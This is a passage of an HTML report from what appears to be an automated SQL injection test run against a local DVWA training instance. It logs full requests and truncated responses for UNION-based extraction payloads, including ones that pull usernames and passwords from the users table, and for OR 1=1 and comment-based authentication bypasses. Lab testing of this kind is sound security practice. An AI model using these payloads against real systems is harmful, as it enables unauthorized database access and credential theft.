+</div><hr><h3>Test ID: UNION_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.645284<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=48
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.693223<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT database(),user()--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=47
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.739683<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=46
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_MEDIUM_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.786465<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=45
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_MEDIUM_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.833731<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM dvwa.users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=44
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.881755<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=43
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.929014<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' #&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=42
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.977142<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'/*&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=41
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.022234<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=40
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.067302<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=39
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_6</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.116193<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' UNION SELECT 'admin','password'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=38
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_7</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.162256<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=37
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_MEDIUM_8</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.211429<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR username='admin&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=36
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: SET_SECURITY_HIGH</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.245066<br><b>URL:</b> http://localhost/dvwa/security.php<br><b>Method:</b> POST</p><h4>Request</h4><div class='code'>POST http://localhost/dvwa/security.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+{'security': 'high', 'seclev_submit': 'Submit', 'user_token': '3809f15e8d5021fe3fbd6d73bdf6f32c'}
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 5043
+Keep-Alive: timeout=5, max=33
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>DVWA Security :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href=".">Home</a></li>
+<li class=""><a href="instructions.php">Instructions</a></...
+</div><hr><h3>Test ID: ERROR_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:32.322149<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=32
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
